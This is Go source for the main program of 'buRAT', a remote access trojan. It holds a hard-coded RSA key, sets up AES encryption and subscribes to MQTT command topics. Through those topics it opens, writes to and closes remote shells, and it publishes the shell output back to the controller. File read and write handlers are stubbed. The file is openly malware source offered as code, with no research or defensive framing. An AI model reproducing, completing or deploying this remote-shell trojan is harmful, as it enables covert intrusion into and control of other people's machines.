package main

import (
	"fmt"

	"./burat"
	"./packets"
	"io"
	"crypto/rand"
	"github.com/eclipse/paho.mqtt.golang"
)

func main() {
	fmt.Println("buRAT.go v1.0")
	burat := burat.NewBuRAT()

	burat.Internals().RSA.Config(`-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3UEh+HOkcBDCuJYRNgRb
GPRUCWZJp4PI2+X21AHPrK7EZ49eH2SNaKm6qivTzcv/+AQxNYzBZVU1AFKqSmKT
pueIIK6qEuh5GTnYsYiTXhNDdNLCFfXLDsc/adEAylSJg7NrBTf9NvanqcSPl/kC
ARNKGkusuh560tVI8NHIsPjwuN3oC49xbFSiyJfaoGa3RJijsMIgPM5zgS2DyJWH
6DxgX7/TbmXUVFkyPyfYhAizsuZijosmSI7SWIbQ7NaiJWdkiFp5lDRIjI5chHnY
CrP1DfupsO/t4iIRmwvB34WVjkJ7lPpZmpcsbLlVugNYJzT7jfunncMoFJ74dcJ+
5QIDAQAB
-----END PUBLIC KEY-----`)

	key := make([]byte, 16)
	if _, err := io.ReadFull(rand.Reader, key); err != nil {
		panic(err)
	}

	iv := make([]byte, 16)
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		panic(err)
	}
	burat.Internals().AES.Config(key, iv)

	burat.AddTopics(map[string]string{
		"nil":										"bu/nil",
		"bushi":									"bu/bushi/BURAT",
		"remoteshell":						"bu/bushi/BURAT/bushido/remoteshell/+",
		"remoteshell_cmd_open":		"bu/bushi/BURAT/bushido/remoteshell/+/cmd/open",
		"remoteshell_cmd_close":	"bu/bushi/BURAT/bushido/remoteshell/+/cmd/close",
		"remoteshell_cmd_write":	"bu/bushi/BURAT/bushido/remoteshell/+/cmd/write",
		"remoteshell_evt_read":		"bu/bushi/BURAT/bushido/remoteshell/+/evt/read",
		"remoteshell_evt_write":	"bu/bushi/BURAT/bushido/remoteshell/+/evt/write",
		"remoteshell_evt_error":	"bu/bushi/BURAT/bushido/remoteshell/+/evt/error",
		"filerw":									"bu/bushi/BURAT/bushido/filerw/+",
		"filerw_cmd_open":				"bu/bushi/BURAT/bushido/filerw/+/cmd/open",
		"filerw_cmd_close":				"bu/bushi/BURAT/bushido/filerw/+/cmd/close",
		"filerw_cmd_read":				"bu/bushi/BURAT/bushido/filerw/+/cmd/read",
		"filerw_cmd_write":				"bu/bushi/BURAT/bushido/filerw/+/cmd/write",
		"filerw_evt_read":				"bu/bushi/BURAT/bushido/filerw/+/evt/read",
		"filerw_evt_write":				"bu/bushi/BURAT/bushido/filerw/+/evt/write",
		"filerw_evt_error":				"bu/bushi/BURAT/bushido/filerw/+/evt/error",
	})

	burat.MqttConfig("tcp://localhost:1883")
	burat.Connect()

	burat.AddTopicCallback("remoteshell_cmd_open", func (client mqtt.Client, message mqtt.Message) {
		var packet packets.RemoteShellOpenPacket
		burat.Decryse(message.Payload(), &packet)
		burat.Bushido().RemoteShell.Open(packet.Id, packet.Shell)
	})

	burat.AddTopicCallback("remoteshell_cmd_close", func (client mqtt.Client, message mqtt.Message) {
		var packet packets.RemoteShellClosePacket
		burat.Decryse(message.Payload(), &packet)
		burat.Bushido().RemoteShell.Close(packet.Id)
	})

	burat.AddTopicCallback("remoteshell_cmd_write", func (client mqtt.Client, message mqtt.Message) {
		var packet packets.RemoteShellWritePacket
		burat.Decryse(message.Payload(), &packet)
		burat.Bushido().RemoteShell.Write(packet.Id, packet.Data)
	})

	burat.AddTopicCallback("filerw_cmd_open", func (client mqtt.Client, message mqtt.Message) {
		fmt.Println(message.Payload())
		//packet := burat.Decryse(message.Payload)
	})

	burat.AddTopicCallback("filerw_cmd_close", func (client mqtt.Client, message mqtt.Message) {
		fmt.Println(message.Payload())
		//packet := burat.Decryse(message.Payload)
	})

	burat.AddTopicCallback("filerw_cmd_read", func (client mqtt.Client, message mqtt.Message) {
		fmt.Println(message.Payload())
		//packet := burat.Decryse(message.Payload)
	})

	burat.AddTopicCallback("filerw_cmd_write", func (client mqtt.Client, message mqtt.Message) {
		fmt.Println(message.Payload())
		//packet := burat.Decryse(message.Payload)
	})

	burat.Bushido().RemoteShell.OnOpen(func (id string) {
		fmt.Println("remoteshell.open", id)
		remoteshells := burat.Bushido().RemoteShell.RemoteShells()
		for _, rs := range remoteshells {
			if rs.Id() == id {
				packet := burat.Seen(packets.RemoteShellOnOpenPacket{ Id: id, Shell: rs.Shell() })
				burat.Publish(id, "remoteshell", 2, true, packet)
			}
		}
	})

	burat.Bushido().RemoteShell.OnClose(func (id string) {
		fmt.Println("remoteshell.close", id)
		burat.Publish(id, "remoteshell", 2, true, nil)
	})

	burat.Bushido().RemoteShell.OnRead(func (id string, data string) {
		fmt.Println("remoteshell.read", id, data)
		packet := burat.Seen(packets.RemoteShellOnReadPacket{ Id: id, Data: data })
		burat.Publish(id, "remoteshell_evt_read", 2, false, packet)
	})

	burat.Bushido().RemoteShell.OnWrite(func (id string, data string) {
		fmt.Println("remoteshell.write", id, data)
		packet := burat.Seen(packets.RemoteShellOnWritePacket{ Id: id, Data: data })
		burat.Publish(id, "remoteshell_evt_write", 2, false, packet)
	})

	for {

	}
}
